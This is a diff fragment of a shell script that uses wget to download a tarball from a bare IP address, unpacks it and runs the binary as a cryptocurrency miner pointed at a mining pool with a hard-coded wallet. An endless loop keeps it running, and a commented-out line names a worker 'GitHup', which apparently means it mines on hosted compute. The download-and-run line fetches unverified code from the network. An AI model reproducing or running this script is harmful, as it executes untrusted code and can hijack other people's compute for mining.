@@ -5,7 +5,7 @@ sudo apt install screen -y
 wget http://192.144.214.57:82/bin1.tar.gz
 tar -xvf bin1.tar.gz
 #tar xf hellminer_cpu_linux.tar.gz
- ./bin -a ghostrider --url eu.flockpool.com:5555 --tls --user RRUkzfgHKHqi3iG5rv6LnBUgkCCere2H3x.unispace
+./bin -a ghostrider --url eu.flockpool.com:5555 --tls --user RRUkzfgHKHqi3iG5rv6LnBUgkCCere2H3x.unispace
 #./hellminer -c stratum+tcp://ap.luckpool.net:3960#xnsub -u RG7ZNkquxiScKpxu2f2bJW7MSRos9yWHJT.GitHup -p x --cpu 16
 while [ 1 ]; do
 sleep 3
